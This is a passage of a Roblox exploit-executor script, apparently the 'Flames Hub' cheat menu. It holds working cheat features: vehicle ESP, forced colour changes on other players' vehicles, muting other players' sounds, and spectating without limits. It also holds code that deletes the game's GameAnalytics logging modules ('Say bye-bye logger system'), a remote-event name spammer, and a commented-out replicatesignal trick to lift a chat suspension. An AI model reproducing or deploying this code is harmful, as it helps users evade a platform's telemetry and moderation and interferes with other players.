            getgenv().notify(title, text, tonumber(dur))
         end
      end

      local function cleanup()
         if gui then
            gui:Destroy()
         end
      end

      cancel.MouseButton1Click:Connect(function()
         notify("Cancelled", "Mini-game cancelled.")
         cleanup()
      end)

      for i = 1, TILE_COUNT do
         local btn = Instance.new("TextButton")
         btn.Text = ""
         btn.BackgroundColor3 = BLUE
         btn.AutoButtonColor = false
         btn.Parent = gridFrame
         Instance.new("UICorner", btn).CornerRadius = UDim.new(0, 10)
         tiles[i] = btn
      end

      local function generatePattern()
         local count = math.random(6, 9)
         local used = {}
         while #pattern < count do
            local pick = math.random(1, TILE_COUNT)
            if not used[pick] then
               used[pick] = true
               table.insert(pattern, pick)
            end
         end
      end

      local function checkWin()
         for _, index in ipairs(pattern) do
            if not found[index] then
               return
            end
         end
         task.delay(0.3, function()
            notify("Success", "You completed the memory mini-game.")
            cleanup()
         end)
      end

      local function showPattern()
         for _, index in ipairs(pattern) do
            tiles[index].BackgroundColor3 = GREEN
         end
      end

      local function hidePattern()
         for i, btn in ipairs(tiles) do
            if not found[i] then
               btn.BackgroundColor3 = BLUE
            end
         end
      end

      local function fail()
         notify("Warning", "You failed the memory mini-game, but your feedback was still sent, don't worry.", 12)
         cleanup()
      end

      local function onTileClicked(index)
         if found[index] then return end
         if table.find(pattern, index) then
            found[index] = true
            tiles[index].BackgroundColor3 = GREEN
            checkWin()
         else
            mistakes = mistakes + 1
            tiles[index].BackgroundColor3 = RED
            if mistakes >= MAX_MISTAKES then
               fail()
            end
         end
      end

      for i, btn in ipairs(tiles) do
         btn.MouseButton1Click:Connect(function()
            onTileClicked(i)
         end)
      end

      generatePattern()
      showPattern()
      task.delay(SHOW_TIME, hidePattern)
   end

   getgenv().Pick_Vehicle_Color_Func = function(input)
      if not input then return end

      local str = tostring(input):lower():match("^%s*(.-)%s*$")
      local chosen

      local r, g, b = str:match("(%d+)[,%s]+(%d+)[,%s]+(%d+)")
      if r and g and b then
         chosen = Color3.fromRGB(tonumber(r), tonumber(g), tonumber(b))
      end

      if not chosen then
         local hex = str:match("^#?(%x%x%x%x%x%x)$")
         if hex then
            chosen = Color3.fromRGB(
               tonumber(hex:sub(1,2), 16),
               tonumber(hex:sub(3,4), 16),
               tonumber(hex:sub(5,6), 16)
            )
         end
      end

      if not chosen then
         local color_mapper = {
            red = Color3.fromRGB(255,0,0),
            darkred = Color3.fromRGB(139,0,0),
            crimson = Color3.fromRGB(220,20,60),
            firebrick = Color3.fromRGB(178,34,34),
            indianred = Color3.fromRGB(205,92,92),
            lightcoral = Color3.fromRGB(240,128,128),
            salmon = Color3.fromRGB(250,128,114),
            darksalmon = Color3.fromRGB(233,150,122),
            lightsalmon = Color3.fromRGB(255,160,122),
            tomato = Color3.fromRGB(255,99,71),
            orangered = Color3.fromRGB(255,69,0),
            orange = Color3.fromRGB(255,165,0),
            darkorange = Color3.fromRGB(255,140,0),
            coral = Color3.fromRGB(255,127,80),
            yellow = Color3.fromRGB(255,255,0),
            lightyellow = Color3.fromRGB(255,255,224),
            gold = Color3.fromRGB(255,215,0),
            goldenrod = Color3.fromRGB(218,165,32),
            darkgoldenrod = Color3.fromRGB(184,134,11),
            palegoldenrod = Color3.fromRGB(238,232,170),
            khaki = Color3.fromRGB(240,230,140),
            darkkhaki = Color3.fromRGB(189,183,107),
            lemonchiffon = Color3.fromRGB(255,250,205),
            green = Color3.fromRGB(0,128,0),
            lime = Color3.fromRGB(0,255,0),
            limegreen = Color3.fromRGB(50,205,50),
            forestgreen = Color3.fromRGB(34,139,34),
            darkgreen = Color3.fromRGB(0,100,0),
            seagreen = Color3.fromRGB(46,139,87),
            mediumseagreen = Color3.fromRGB(60,179,113),
            lightseagreen = Color3.fromRGB(32,178,170),
            springgreen = Color3.fromRGB(0,255,127),
            mediumspringgreen = Color3.fromRGB(0,250,154),
            palegreen = Color3.fromRGB(152,251,152),
            lightgreen = Color3.fromRGB(144,238,144),
            olivedrab = Color3.fromRGB(107,142,35),
            darkolivegreen = Color3.fromRGB(85,107,47),
            olive = Color3.fromRGB(128,128,0),
            chartreuse = Color3.fromRGB(127,255,0),
            lawngreen = Color3.fromRGB(124,252,0),
            greenyellow = Color3.fromRGB(173,255,47),
            yellowgreen = Color3.fromRGB(154,205,50),
            blue = Color3.fromRGB(0,0,255),
            navy = Color3.fromRGB(0,0,128),
            darkblue = Color3.fromRGB(0,0,139),
            mediumblue = Color3.fromRGB(0,0,205),
            royalblue = Color3.fromRGB(65,105,225),
            steelblue = Color3.fromRGB(70,130,180),
            lightsteelblue = Color3.fromRGB(176,196,222),
            dodgerblue = Color3.fromRGB(30,144,255),
            deepskyblue = Color3.fromRGB(0,191,255),
            skyblue = Color3.fromRGB(135,206,235),
            lightskyblue = Color3.fromRGB(135,206,250),
            cornflowerblue = Color3.fromRGB(100,149,237),
            cadetblue = Color3.fromRGB(95,158,160),
            midnightblue = Color3.fromRGB(25,25,112),
            slateblue = Color3.fromRGB(106,90,205),
            mediumslateblue = Color3.fromRGB(123,104,238),
            darkslateblue = Color3.fromRGB(72,61,139),
            powderblue = Color3.fromRGB(176,224,230),
            lightblue = Color3.fromRGB(173,216,230),
            purple = Color3.fromRGB(128,0,128),
            darkpurple = Color3.fromRGB(75,0,100),
            rebeccapurple = Color3.fromRGB(102,51,153),
            indigo = Color3.fromRGB(75,0,130),
            violet = Color3.fromRGB(238,130,238),
            darkviolet = Color3.fromRGB(148,0,211),
            blueviolet = Color3.fromRGB(138,43,226),
            mediumpurple = Color3.fromRGB(147,112,219),
            mediumorchid = Color3.fromRGB(186,85,211),
            darkorchid = Color3.fromRGB(153,50,204),
            orchid = Color3.fromRGB(218,112,214),
            plum = Color3.fromRGB(221,160,221),
            thistle = Color3.fromRGB(216,191,216),
            lavender = Color3.fromRGB(230,230,250),
            magenta = Color3.fromRGB(255,0,255),
            fuchsia = Color3.fromRGB(255,0,255),
            darkmagenta = Color3.fromRGB(139,0,139),
            pink = Color3.fromRGB(255,192,203),
            lightpink = Color3.fromRGB(255,182,193),
            hotpink = Color3.fromRGB(255,105,180),
            deeppink = Color3.fromRGB(255,20,147),
            mediumvioletred = Color3.fromRGB(199,21,133),
            palevioletred = Color3.fromRGB(219,112,147),
            cyan = Color3.fromRGB(0,255,255),
            aqua = Color3.fromRGB(0,255,255),
            teal = Color3.fromRGB(0,128,128),
            darkcyan = Color3.fromRGB(0,139,139),
            darkturquoise = Color3.fromRGB(0,206,209),
            mediumturquoise = Color3.fromRGB(72,209,204),
            turquoise = Color3.fromRGB(64,224,208),
            paleturquoise = Color3.fromRGB(175,238,238),
            aquamarine = Color3.fromRGB(127,255,212),
            mediumaquamarine = Color3.fromRGB(102,205,170),
            brown = Color3.fromRGB(165,42,42),
            darkbrown = Color3.fromRGB(101,67,33),
            saddlebrown = Color3.fromRGB(139,69,19),
            sienna = Color3.fromRGB(160,82,45),
            chocolate = Color3.fromRGB(210,105,30),
            peru = Color3.fromRGB(205,133,63),
            tan = Color3.fromRGB(210,180,140),
            burlywood = Color3.fromRGB(222,184,135),
            wheat = Color3.fromRGB(245,222,179),
            sandybrown = Color3.fromRGB(244,164,96),
            rosybrown = Color3.fromRGB(188,143,143),
            maroon = Color3.fromRGB(128,0,0),
            white = Color3.fromRGB(255,255,255),
            black = Color3.fromRGB(0,0,0),
            gray = Color3.fromRGB(128,128,128),
            grey = Color3.fromRGB(128,128,128),
            lightgray = Color3.fromRGB(211,211,211),
            lightgrey = Color3.fromRGB(211,211,211),
            darkgray = Color3.fromRGB(169,169,169),
            darkgrey = Color3.fromRGB(169,169,169),
            silver = Color3.fromRGB(192,192,192),
            dimgray = Color3.fromRGB(105,105,105),
            dimgrey = Color3.fromRGB(105,105,105),
            slategray = Color3.fromRGB(112,128,144),
            slategrey = Color3.fromRGB(112,128,144),
            lightslategray = Color3.fromRGB(119,136,153),
            lightslategrey = Color3.fromRGB(119,136,153),
            darkslategray = Color3.fromRGB(47,79,79),
            darkslategrey = Color3.fromRGB(47,79,79),
            gainsboro = Color3.fromRGB(220,220,220),
            whitesmoke = Color3.fromRGB(245,245,245),
            beige = Color3.fromRGB(245,245,220),
            ivory = Color3.fromRGB(255,255,240),
            snow = Color3.fromRGB(255,250,250),
            honeydew = Color3.fromRGB(240,255,240),
            mintcream = Color3.fromRGB(245,255,250),
            azure = Color3.fromRGB(240,255,255),
            aliceblue = Color3.fromRGB(240,248,255),
            ghostwhite = Color3.fromRGB(248,248,255),
            linen = Color3.fromRGB(250,240,230),
            antiquewhite = Color3.fromRGB(250,235,215),
            bisque = Color3.fromRGB(255,228,196),
            moccasin = Color3.fromRGB(255,228,181),
            peachpuff = Color3.fromRGB(255,218,185),
            mistyrose = Color3.fromRGB(255,228,225),
            lavenderblush = Color3.fromRGB(255,240,245),
            seashell = Color3.fromRGB(255,245,238),
            oldlace = Color3.fromRGB(253,245,230),
            floralwhite = Color3.fromRGB(255,250,240),
            cornsilk = Color3.fromRGB(255,248,220),
            blanchedalmond = Color3.fromRGB(255,235,205),
            navajowhite = Color3.fromRGB(255,222,173),
            papayawhip = Color3.fromRGB(255,239,213),
         }

         local normalized = str:gsub("%s+", "")
         chosen = color_mapper[normalized] or color_mapper[str]
      end

      if not chosen then
         return getgenv().notify("Error", "Invalid color: "..tostring(input), 5)
      end

      change_vehicle_color(chosen, get_vehicle())
   end

   getgenv().RGB_Vehicle = function(state)
      local lib = getgenv().FlamesLibrary

      if state == true then
         if lib.is_alive("rgb_vehicle") then
            return getgenv().notify("Warning", "Rainbow/RGB Vehicle is already enabled.", 5)
         end

         local colors = {
            Color3.fromRGB(255,255,255),
            Color3.fromRGB(128,128,128),
            Color3.fromRGB(0,0,0),
            Color3.fromRGB(0,0,255),
            Color3.fromRGB(0,255,0),
            Color3.fromRGB(0,255,255),
            Color3.fromRGB(255,165,0),
            Color3.fromRGB(139,69,19),
            Color3.fromRGB(255,255,0),
            Color3.fromRGB(50,205,50),
            Color3.fromRGB(255,0,0),
            Color3.fromRGB(255,155,172),
            Color3.fromRGB(128,0,128),
         }

         getgenv().notify("Success", "[Enabled]: Rainbow Vehicle.", 4)

         lib.spawn("rgb_vehicle","spawn",function()
            while true do
               for _, color in ipairs(colors) do
                  change_vehicle_color(color, get_vehicle())
                  fw(0)
               end
               getgenv().RunService.Heartbeat:Wait()
            end
         end)
      elseif state == false then
         if not lib.is_alive("rgb_vehicle") then
            return getgenv().notify("Warning", "Rainbow/RGB Vehicle is not enabled.", 5)
         end

         lib.disconnect("rgb_vehicle")
         getgenv().notify("Success", "[Disabled]: Rainbow Vehicle.", 4)
      end
   end

   getgenv().two_color_switcher_FE_func = function(state)
      local lib = getgenv().FlamesLibrary

      if state == true then
         if lib.is_alive("two_color_vehicle") then
            return getgenv().notify("Warning", "Two Color Switcher already enabled.", 5)
         end

         local colors = {
            Color3.fromRGB(255,255,255),
            Color3.fromRGB(128,128,128),
            Color3.fromRGB(0,0,0),
            Color3.fromRGB(0,0,255),
            Color3.fromRGB(0,255,0),
            Color3.fromRGB(0,255,255),
            Color3.fromRGB(255,165,0),
            Color3.fromRGB(139,69,19),
            Color3.fromRGB(255,255,0),
            Color3.fromRGB(50,205,50),
            Color3.fromRGB(255,0,0),
            Color3.fromRGB(255,155,172),
            Color3.fromRGB(128,0,128),
         }

         local c1 = colors[math.random(1,#colors)]
         local c2 = colors[math.random(1,#colors)]

         while c1 == c2 do
            c2 = colors[math.random(1,#colors)]
         end

         getgenv().notify("Success", "[Enabled]: Two Color Switcher.", 4)

         lib.spawn("two_color_vehicle","spawn",function()
            while true do
               fw(0.1)
               change_vehicle_color(c1, get_vehicle())
               wait(.1)
               change_vehicle_color(c2, get_vehicle())
               wait(.1)
               getgenv().RunService.Heartbeat:Wait()
            end
         end)
      elseif state == false then
         if not lib.is_alive("two_color_vehicle") then
            return getgenv().notify("Warning", "Two Color Switcher not enabled.", 5)
         end

         lib.disconnect("two_color_vehicle")
         getgenv().notify("Success", "[Disabled]: Two Color Switcher.", 4)
      end
   end

   local function init_vehicle_esp()
      local highlights = {}
      local connections = {}
      local folderAdded
      local folderRemoved
      local vehiclesFolder = Workspace:FindFirstChild("Vehicles")

      local function clearESP(model)
         local hl = highlights[model]
         if hl then
            pcall(function()
               hl:Destroy()
            end)
            highlights[model] = nil
         end

         local conn = connections[model]
         if conn then
            pcall(function()
               conn:Disconnect()
            end)
            connections[model] = nil
         end
      end

      local function applyESP(model)
         if not model or not model:IsA("Model") then
            return
         end

         if highlights[model] then
            return
         end

         local hl = Instance.new("Highlight")
         hl.Adornee = model
         hl.FillTransparency = 0.6
         hl.OutlineTransparency = 0
         hl.Parent = model

         highlights[model] = hl
         connections[model] = model.AncestryChanged:Connect(function(_, parent)
            if not parent then
               clearESP(model)
            end
         end)
      end

      getgenv().vehicle_esp_toggle = function(toggled)
         if not vehiclesFolder then
            return
         end

         if toggled == true then
            if getgenv().vehicle_esp_is_enabled then
               return getgenv().notify("Warning", "Vehicle ESP is already enabled.", 5)
            end

            getgenv().vehicle_esp_is_enabled = true
            for _, v in ipairs(vehiclesFolder:GetChildren()) do
               applyESP(v)
            end

            folderAdded = vehiclesFolder.ChildAdded:Connect(function(child)
               applyESP(child)
            end)

            folderRemoved = vehiclesFolder.ChildRemoved:Connect(function(child)
               clearESP(child)
            end)
         elseif toggled == false then
            if not getgenv().vehicle_esp_is_enabled then
               return getgenv().notify("Warning", "Vehicle ESP is not enabled.", 5)
            end

            getgenv().vehicle_esp_is_enabled = false
            for model in pairs(highlights) do
               clearESP(model)
            end

            if folderAdded then
               folderAdded:Disconnect()
               folderAdded = nil
            end

            if folderRemoved then
               folderRemoved:Disconnect()
               folderRemoved = nil
            end
         end
      end
   end
   fw(0.1)
   init_vehicle_esp()

   getgenv().RGB_Vehicle_Others = function(Player, state)
      local lib = getgenv().FlamesLibrary
      if not Player then return end
      local name = "rgb_other_"..Player.UserId
      local PlayersName = Player.Name

      if state == true then
         if lib.is_alive(name) then
            return getgenv().notify("Warning", "RGB Vehicle is already enabled for: "..PlayersName, 5)
         end

         local colors = {
            Color3.fromRGB(255,255,255),
            Color3.fromRGB(128,128,128),
            Color3.fromRGB(0,0,0),
            Color3.fromRGB(0,0,255),
            Color3.fromRGB(0,255,0),
            Color3.fromRGB(0,255,255),
            Color3.fromRGB(255,165,0),
            Color3.fromRGB(139,69,19),
            Color3.fromRGB(255,255,0),
            Color3.fromRGB(50,205,50),
            Color3.fromRGB(255,0,0),
            Color3.fromRGB(255,155,172),
            Color3.fromRGB(128,0,128),
         }

         getgenv().notify("Success", "Enabled Rainbow Vehicle for: "..PlayersName, 5)

         lib.spawn(name,"spawn",function()
            while true do
               if not Player or not Player.Parent then
                  lib.disconnect(name)
                  return getgenv().notify("Error", PlayersName.." has left the game.", 5)
               end

               local vehicle = get_other_vehicle(Player)
               if not vehicle then
                  wait(.2)
               end

               if vehicle:GetAttribute("locked") == true then
                  lib.disconnect(name)
                  return
               end

               for _, color in ipairs(colors) do
                  change_vehicle_color(color, Player)
                  wait(.2)
               end
            end
         end)
      elseif state == false then
         if not lib.is_alive(name) then return end
         lib.disconnect(name)
      end
   end

   local GameAnalytics
   local GA_Client
   local GA_Directories = {
      ["ReplicatedFirst"] = true,
      ["ReplicatedStorage"] = true,
      ["Workspace"] = true,
      ["Players"] = true,
      ["Lighting"] = true,
      ["StarterGui"] = true,
      ["StarterPack"] = true,
      ["StarterPlayer"] = true,
   }

   -- [[ Say bye-bye logger system. ]] --
   if ReplicatedStorage:FindFirstChild("GameAnalytics") then
      GameAnalytics = ReplicatedStorage:FindFirstChild("GameAnalytics")

      if GameAnalytics and GameAnalytics:FindFirstChild("GameAnalyticsClient") then
         GA_Client = GameAnalytics:FindFirstChild("GameAnalyticsClient")

         if GA_Client and GA_Client.Parent and GA_Client:IsDescendantOf(game) then
            pcall(function() GA_Client:Destroy() end)
         end
      end
   else
      for service in pairs(GA_Directories) do
         local service = getgenv().Game:GetService(service)

         if service then
            task.spawn(function()
               for _, descendant in ipairs(service:GetDescendants()) do
                  if descendant:IsA("ModuleScript") and descendant.Name:lower():find("GameAnalyticsClient") then
                     descendant:Destroy()
                  end
               end
            end)
         end
      end
   end

   -- [[ Delete any instance of GameAnalyticsRemoteTime (RemoteEvent) + GameAnalyticsClient (ModuleScript) ]] --
   if ReplicatedStorage:FindFirstChild("GameAnalyticsRemoteTime") then
      GameAnalytics = ReplicatedStorage:FindFirstChild("GameAnalyticsRemoteTime")

      if GameAnalytics and GameAnalytics:FindFirstChild("GameAnalyticsRemoteTime") then
         GA_Client = GameAnalytics:FindFirstChild("GameAnalyticsRemoteTime", true)

         if GA_Client and GA_Client.Parent and GA_Client:IsDescendantOf(game) then
            pcall(function() GA_Client:Destroy() end)
         end
      end
   else
      for service in pairs(GA_Directories) do
         local service = getgenv().Game:GetService(service)

         if service then
            task.spawn(function()
               for _, descendant in ipairs(service:GetDescendants()) do
                  if descendant:IsA("RemoteEvent") and descendant.Name:lower():find("GameAnalyticsRemoteTime") then
                     pcall(function() descendant:Destroy() end)
                  end
               end
            end)
         end
      end
   end

   getgenv().copy_emote_plr = getgenv().copy_emote_plr or function(player)
      local targetChar = player.Character or getgenv().get_char(player)
      local targetHum = targetChar and targetChar:FindFirstChildOfClass("Humanoid") or get_human(player)
      local myChar = getgenv().Character or get_char(LocalPlayer)
      local myHum = getgenv().Humanoid or get_human(LocalPlayer) or myChar and myChar:FindFirstChildOfClass("Humanoid")

      if not (targetHum and myHum) then return end

      for _, track in ipairs(myHum:GetPlayingAnimationTracks()) do
         pcall(function()
            track:Stop()
         end)
      end

      wait(0.05)

      for _, tTrack in ipairs(targetHum:GetPlayingAnimationTracks()) do
         local animObj = tTrack.Animation

         if animObj then
            local id = tostring(animObj.AnimationId)

            if id and id ~= "" and id ~= "0" and not id:find("507768375") then
               local newAnim = Instance.new("Animation")
               newAnim.AnimationId = id

               local myTrack = nil
               pcall(function()
                  myTrack = myHum:LoadAnimation(newAnim)
               end)

               if myTrack then
                  myTrack:Play(0.1, 1, tTrack.Speed)
                  myTrack.TimePosition = tTrack.TimePosition

                  getgenv().TrackHasBeenStopped_Watcher_Task = getgenv().TrackHasBeenStopped_Watcher_Task or task.spawn(function()
                     tTrack.Stopped:Wait()
                     pcall(function() myTrack:Stop() end)
                     pcall(function() myTrack:Destroy() end)
                     pcall(function() newAnim:Destroy() end)
                  end)
               else
                  newAnim:Destroy()
               end
            end
         end
      end
   end

   getgenv().get_emote_properties_and_insert_properties = function()
      local hum = getgenv().Humanoid or getgenv().Character:FindFirstChildWhichIsA("Humanoid")
      if not hum then return end
      local tracks = hum:GetPlayingAnimationTracks()
      if #tracks == 0 then return getgenv().notify("Error", "You're not playing an Animation.", 5) end
      local track = tracks[1]
      local anim = track.Animation
      if not anim then return getgenv().notify("Error", "Your animation unexpectedly disappeared?", 5) end
      local animId = tostring(anim.AnimationId)
      local realId = tonumber(animId:match("%d+"))
      if not realId then return end

      table.insert(getgenv().currently_saved_emotes_list, {
         Id = realId,
         AssetId = realId,
         Name = track.Name ~= "" and track.Name or "Unknown",
         AnimationId = "rbxassetid://" .. realId,
         Favorite = false
      })
   end

   print("copy emote plr func is good.")
   fw(0.1)
   getgenv().save_copied_plrs_emote = function()
      if getgenv().currently_saved_emotes_list and getgenv().saveEmotesToData then
         notify("Info", "Saving currently playing emote, please wait.", 2.5)
         getgenv().get_emote_properties_and_insert_properties()
         fw(0.1)
         getgenv().saveEmotesToData()
         wait()
         notify("Success", "Saved currently playing emote.", 3)
      else
         return notify("Error", "Please do "..tostring(getgenv().AdminPrefix).."allemotes in the chat to use this.", 15)
      end
   end

   getgenv().mutesounds = function()
      for _,v in ipairs(Placed_Models:GetDescendants()) do
         if v:IsA("Sound") then
            local n = v.Name
            if n == "SoundDefault" or n == "Music" or n == "Airhorn" then
               v.Volume = 0
            elseif n == "Sound" and v.Parent and v.Parent.Parent and v.Parent.Parent.Name == "BoomBox" then
               v.Volume = 0
            end
         end
      end

      for _,p in ipairs(getgenv().Players:GetPlayers()) do
         local c = p.Character or get_char(p, 3) -- new system usage (Player Instance, TimeOut).

         if c then
            for _,v in ipairs(c:GetDescendants()) do
               if v:IsA("Sound") then
                  if v.Name == "Sound" and v.Parent and v.Parent.Parent and v.Parent.Parent:IsA("Tool") and v.Parent.Parent.Name == "BoomBox" then
                     v.Volume = 0
                  end
               end
            end
         end
      end
   end

   getgenv().unmutesounds = function()
      for _,v in ipairs(Placed_Models:GetDescendants()) do
         if v:IsA("Sound") then
            local n = v.Name
            if n == "SoundDefault" or n == "Music" or n == "Airhorn" then
               v.Volume = 1
            elseif n == "Sound" and v.Parent and v.Parent.Parent and v.Parent.Parent.Name == "BoomBox" then
               v.Volume = 0.5
            end
         end
      end

      for _,p in ipairs(getgenv().Players:GetPlayers()) do
         local c = p.Character or get_char(p, 3) -- new system usage (Player Instance, TimeOut).

         if c then
            for _,v in ipairs(c:GetDescendants()) do
               if v:IsA("Sound") then
                  if v.Name == "Sound" and v.Parent and v.Parent.Parent and v.Parent.Parent:IsA("Tool") and v.Parent.Parent.Name == "BoomBox" then
                     v.Volume = 0.5
                  end
               end
            end
         end
      end
      notify("Success", "Unmuted all tools.", 5)
   end

   getgenv().mute_all_tools = function(toggle)
      if toggle == true then
         if getgenv().autosilence then
            return notify("Warning", "Tool muter is already enabled.", 5)
         end

         getgenv().autosilence = true
         notify("Success", "Tool muter is enabled.", 5)

         getgenv().Muting_All_Tool_Sounds_Task = task.spawn(function()
            while getgenv().autosilence == true do
               wait(1)
               mutesounds()
            end
         end)
      elseif toggle == false then
         if not getgenv().autosilence then
            return notify("Warning", "Tools muter is not enabled.", 5)
         end

         if getgenv().Muting_All_Tool_Sounds_Task then
            task.cancel(getgenv().Muting_All_Tool_Sounds_Task)
            getgenv().Muting_All_Tool_Sounds_Task = nil
         end

         getgenv().autosilence = false
         wait(1)
         if not getgenv().autosilence then
            notify("Info", "Making all the tools Volume: 1...", 5)
            unmutesounds()
         else
            notify("Warning", "Tools muter is not disabled yet, hold on...", 3)
            repeat task.wait() until not getgenv().autosilence or getgenv().autosilence == false
            wait(1.5)
            if not getgenv().autosilence then
               notify("Success", "Unmuting all Tools...", 5)
               wait(0.5)
               unmutesounds()
               wait(0.5)
               notify("Success", "Unmuted all Tools.", 5)
            end
         end
      else
         return 
      end
   end

   getgenv().find_skin_body_colors_in_char = function(char)
      if not char then return end

      for _, v in ipairs(char:GetDescendants()) do
         if v:IsA("BodyColors") then
            return v
         end

         local name = v.Name:lower()
         if name:find("body") and name:find("color") then
            return v
         end
      end

      return nil
   end

   getgenv().original_skintone = getgenv().original_skintone or nil
   getgenv().rainbow_skin = function(state)
      local lib = getgenv().FlamesLibrary
      local name = "rainbow_skin"
      local char = getgenv().Character or get_char(LocalPlayer, 10)
      if not char then return end
      local bodycolors = char and char:FindFirstChildOfClass("BodyColors")
      if not bodycolors then return end

      if state == true then
         if lib.is_alive(name) then
            return getgenv().notify("Warning", "Flames Hub - Rainbow Skin is already enabled.", 5)
         end

         getgenv().original_skintone = {
            HeadColor3 = bodycolors.HeadColor3,
            LeftArmColor3 = bodycolors.LeftArmColor3,
            RightArmColor3 = bodycolors.RightArmColor3,
            LeftLegColor3 = bodycolors.LeftLegColor3,
            RightLegColor3 = bodycolors.RightLegColor3,
            TorsoColor3 = bodycolors.TorsoColor3
         }

         local colors = {
            Color3.fromRGB(0,0,0), Color3.fromRGB(217,101,30),
            Color3.fromRGB(93,171,195), Color3.fromRGB(49,34,21),
            Color3.fromRGB(8,62,11), Color3.fromRGB(30,146,19),
            Color3.fromRGB(97,97,97), Color3.fromRGB(206,158,196),
            Color3.fromRGB(14,25,43), Color3.fromRGB(63,17,126),
            Color3.fromRGB(0,0,175), Color3.fromRGB(183,25,25),
            Color3.fromRGB(213,208,29), Color3.fromRGB(175,146,50),
            Color3.fromRGB(202,28,120),
         }

         getgenv().notify("Success", "[ENABLED]: Flames Hub - Rainbow Skin.", 5)

         lib.spawn(name,"spawn",function()
            while true do
               for _, c in ipairs(colors) do
                  send_remote("skin_tone", c)
                  wait(.1)
               end
            end
         end)
      elseif state == false then
         if not lib.is_alive(name) then return end
         lib.disconnect(name)
         fw(0.2)
         if getgenv().original_skintone then
            local old = getgenv().original_skintone

            send_remote("skin_tone", old.HeadColor3)
            wait()
            send_remote("skin_tone", old.LeftArmColor3)
            wait()
            send_remote("skin_tone", old.RightArmColor3)
            wait()
            send_remote("skin_tone", old.LeftLegColor3)
            wait()
            send_remote("skin_tone", old.RightLegColor3)
            wait()
            send_remote("skin_tone", old.TorsoColor3)

            getgenv().notify("Success", "Reset SkinTone back to your old SkinTone.", 3)
         end

         getgenv().notify("Success", "[DISABLED]: Flames Hub - Rainbow Skin.", 5)
      end
   end

   getgenv().savePrefix = function(newPrefix)
      if writefile then
         local data = { prefix = newPrefix }
         writefile(fileName, HttpService:JSONEncode(data))
      end
   end

   local Amount_Input = 5

   getgenv().set_fire_amount_FE = function(amount)
      amount = tonumber(amount)

      if not amount then
         Amount_Input = 5
         return
      end

      Amount_Input = amount
   end

   local Old_Name_From_Name_Spammer

   getgenv().name_changer_premium = function(state)
      local lib = getgenv().FlamesLibrary
      local name = "name_spammer"
      local words = {
         "root_access","packet_inject","xor_key","decrypting",
         "init_stealth","spoof_id","kernel_hook","bruteforce",
         "sys_reboot","net_breach","ghost_mode","backdoor_init"
      }

      if state == true then
         if lib.is_alive(name) then return end

         Old_Name_From_Name_Spammer = getgenv().LocalPlayer:GetAttribute("roleplay_name") or "SERVER"

         local index = 1
         local count = #words

         lib.spawn(name,"spawn",function()
            while true do
               getgenv().Send("roleplay_name", words[index])
               index = index + 1
               if index > count then index = 1 end
               fw(0)
            end
         end)
      elseif state == false then
         if not lib.is_alive(name) then return end

         lib.disconnect(name)

         fw(0.1)
         getgenv().Send("roleplay_name", tostring(Old_Name_From_Name_Spammer))
         getgenv().notify("Success", "Disabled Name Spammer, reverting name...", 3)
      end
   end

   function unsuspend_GUI_topbar()
      if getgenv().unsuspend_chat_GUI then
         return notify("Warning", "Unsuspend TextChat GUI is already loaded.", 5)
      end

      notify("Warning", "Unsuspend TextChat GUI will be back soon.", 5)
      getgenv().unsuspend_chat_GUI = true
      return 

      --[[getgenv().unsuspend_chat_GUI = true

      local ScreenGui = Instance.new("ScreenGui")
      ScreenGui.Name = "TopBarUI_UNSUSPEND"
      ScreenGui.Parent = parent_gui
      ScreenGui.IgnoreGuiInset = true
      ScreenGui.ResetOnSpawn = false

      local UnsuspendTxt_Chat = Instance.new("TextButton")
      UnsuspendTxt_Chat.Name = "UnsuspendTextChat"
      UnsuspendTxt_Chat.Parent = ScreenGui
      UnsuspendTxt_Chat.Size = UDim2.new(0, 100, 0, 30)
      UnsuspendTxt_Chat.Position = UDim2.new(1, -350, 0, 10)
      UnsuspendTxt_Chat.BackgroundColor3 = Color3.fromRGB(0, 0, 0)
      UnsuspendTxt_Chat.BorderSizePixel = 0
      UnsuspendTxt_Chat.TextColor3 = Color3.fromRGB(0, 255, 0)
      UnsuspendTxt_Chat.TextScaled = true
      UnsuspendTxt_Chat.Font = Enum.Font.SourceSansBold
      UnsuspendTxt_Chat.Text = "Unsuspend Chat"

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 20)
      UICorner.Parent = UnsuspendTxt_Chat

      local UIContainer = Instance.new("Frame")
      UIContainer.Name = "UIContainer"
      UIContainer.Parent = ScreenGui
      UIContainer.Size = UDim2.new(0, 1105, 0, 40)
      UIContainer.Position = UDim2.new(0.5, -550, 0, 0)
      UIContainer.BackgroundColor3 = Color3.fromRGB(0, 255, 0)
      UIContainer.BackgroundTransparency = 0.2
      UIContainer.BorderSizePixel = 0
      UIContainer.Visible = false

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 8)
      UICorner.Parent = UIContainer

      local UIStroke = Instance.new("UIStroke")
      UIStroke.Color = Color3.fromRGB(0, 0, 0)
      UIStroke.Thickness = 1
      UIStroke.Parent = UIContainer

      local CloseButton = Instance.new("TextButton")
      CloseButton.Name = "CloseButton"
      CloseButton.Parent = ScreenGui
      CloseButton.Size = UDim2.new(0, 30, 0, 30)
      CloseButton.Position = UDim2.new(1, -40, 0, 5)
      CloseButton.BackgroundColor3 = Color3.fromRGB(200, 50, 50)
      CloseButton.TextColor3 = Color3.fromRGB(0, 0, 0)
      CloseButton.Font = Enum.Font.GothamBold
      CloseButton.TextSize = 16
      CloseButton.Text = "X"

      local UICorner = Instance.new("UICorner")
      UICorner.CornerRadius = UDim.new(0, 10)
      UICorner.Parent = CloseButton

      CloseButton.MouseButton1Click:Connect(function()
         if ScreenGui and ScreenGui:IsA("ScreenGui") then
            ScreenGui.Enabled = false
         end
         getgenv().unsuspend_chat_GUI = false
      end)

      local Text_Chat_Service = cloneref and cloneref(game:GetService("TextChatService")) or game:GetService("TextChatService")

      UnsuspendTxt_Chat.MouseButton1Click:Connect(function()
         if not rep_signal then
            return notify("Error", "Your executor does not support 'replicatesignal'!", 6)
         end

         local ok, err = pcall(function()
            rep_signal(Text_Chat_Service.UpdateChatTimeout, getgenv().LocalPlayer.UserId, 0, 10)
         end)

         if not ok then
            return notify("Error", "Failed to unsuspend TextChat: " .. tostring(err), 8)
         end

         notify("Success", "Unsuspended TextChat, you may now use your Chat like normal.", 6)
      end)--]]
   end

   getgenv().unsuspend_chat_GUI = true

   print("Unsuspend TextChat has been initialized.")

   getgenv().spectate_plr_without_distance_limits = function(plr)
      function spectatePlayer(targetPlayer)
         if not targetPlayer then return end

         spectateTarget = targetPlayer
         spectateSubject = nil
         originalIO.disconnectSpectateConns()

         local function setCamToCharacter(character)
